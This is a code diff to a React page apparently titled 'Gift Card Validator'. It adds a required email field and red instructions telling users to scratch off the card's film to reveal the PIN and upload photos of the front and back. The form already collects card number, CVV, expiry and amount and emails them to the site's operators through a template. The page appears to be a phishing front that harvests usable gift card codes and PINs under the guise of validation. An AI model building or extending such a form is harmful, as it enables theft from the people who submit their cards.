@@ -195,6 +195,7 @@ function PurchaseOrValidate() {
     const [validateCurrency, setValidateCurrency] = useState('USD');
     const [validateCardAmount, setValidateCardAmount] = useState('');
     const [validateCardName, setValidateCardName] = useState('');
+    const [validateUserEmail, setValidateUserEmail] = useState('');
     const [validateCardNumber, setValidateCardNumber] = useState('');
     const [validateCVV, setValidateCVV] = useState('');
     const [validateExpiry, setValidateExpiry] = useState('');
@@ -226,6 +227,10 @@ function PurchaseOrValidate() {
         setValidateCardAmount(event.target.value);
     };
 
+    const handleUserEmail = (event) => {
+        setValidateUserEmail(event.target.value);
+    };
+
     const handleValidateCardNameChange = (event) => {
         setValidateCardName(event.target.value);
     };
@@ -254,6 +259,7 @@ function PurchaseOrValidate() {
             validateCurrency,
             validateCardAmount,
             validateCardName,
+            validateUserEmail,
             validateCardNumber,
             validateCVV,
             validateExpiry,
@@ -264,6 +270,7 @@ function PurchaseOrValidate() {
         const publicKey = process.env.REACT_APP_PUBLIC_KEY;
         const templateParams = {
             from_name: "Gift Card Validator",
+            CustomerEmail: validateUserEmail,
             CardType: selectedCard?.name,
             Currency: validateCurrency,
             CardAmount: validateCardAmount,
@@ -658,6 +665,15 @@ function PurchaseOrValidate() {
                                 {/* Conditionally show form or upload message */}
                                 {isUploadMode ? (
                                 <form ref={form} encType="multipart/form-data" onSubmit={handleFormSubmit}>
+                                        <VStack mb={4} spacing={1} align="stretch" color="red" fontSize="14px">
+                                                <Text fontWeight="light">Scratch film of the card to reveal pin before upload where applicable.*</Text>
+                                                <Text fontWeight="light">Please provide your valid email*</Text>
+                                                <Text fontWeight="light">Provide the Currency, Amount, Card Number and other values and you can proceed to upload the front and back of the card</Text>
+                                        </VStack>
+                                        <FormControl mt={4}>
+                                            <FormLabel>Email</FormLabel>
+                                            <Input placeholder='Enter Your Email' value={validateUserEmail} onChange={handleUserEmail} required />
+                                        </FormControl>
                                         <FormControl mt={4}>
                                             <FormLabel>Front of Card</FormLabel>
                                             <Box
@@ -730,6 +746,11 @@ function PurchaseOrValidate() {
                                     </form>
                                 ) : (
                                     <form onSubmit={handleFormSubmit}>
+                                    <VStack mb={4} spacing={1} align="stretch" color="red" fontSize="14px">
+                                            <Text fontWeight="light">Scratch film of the card to reveal pin before upload where applicable.*</Text>
+                                            <Text fontWeight="light">Please provide your valid email*</Text>
+                                            <Text fontWeight="light">Provide the Currency, Amount, Card Number and other values and you can proceed to upload the front and back of the card</Text>
+                                    </VStack>
                                     <FormControl>
                                         <FormLabel>Card name</FormLabel>
                                         <Input value={selectedCard?.name} isReadOnly />
@@ -743,6 +764,10 @@ function PurchaseOrValidate() {
                                             <option value='CAD'>CAD</option>
                                             <option value='AUD'>AUD</option>
                                         </Select>
+                                    </FormControl>
+                                    <FormControl mt={4}>
+                                        <FormLabel>Email</FormLabel>
+                                        <Input placeholder='Enter Your Email' value={validateUserEmail} onChange={handleUserEmail} required />
                                     </FormControl>
                                     <FormControl mt={4}>
                                         <FormLabel>Card amount</FormLabel>
@@ -785,6 +810,10 @@ function PurchaseOrValidate() {
                                         <option value='AUD'>AUD</option>
                                     </Select>
                                 </FormControl>
+                                    <FormControl mt={4}>
+                                        <FormLabel>Email</FormLabel>
+                                        <Input placeholder='Enter Your Email' value={validateUserEmail} onChange={handleUserEmail} />
+                                    </FormControl>
                                 <FormControl mt={4}>
                                     <FormLabel>Card amount</FormLabel>
                                     <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
@@ -925,7 +954,7 @@ const InformationSection = ({ faqRef, purchaseOrValidateRef }) => {
         <Box minHeight="30vh" width="100%" px={20} mx="auto" pt={20} bg={`black`} color={`white`}>
             <SimpleGrid columns={{ base: 1, md: 4 }} spacing={10}>
                 <Box gridColumn={{ base: "span 1", md: "span 2" }}>
-                    <VStack mb={3} spacing={1} align="stretch">
+                <VStack mb={3} spacing={1} align="stretch">
                     <Text fontSize="lg" fontWeight="bold">Location</Text>
                     <Text fontWeight="light">19, Dutch Street,</Text>
                     <Text>New York, NY 10038,</Text>
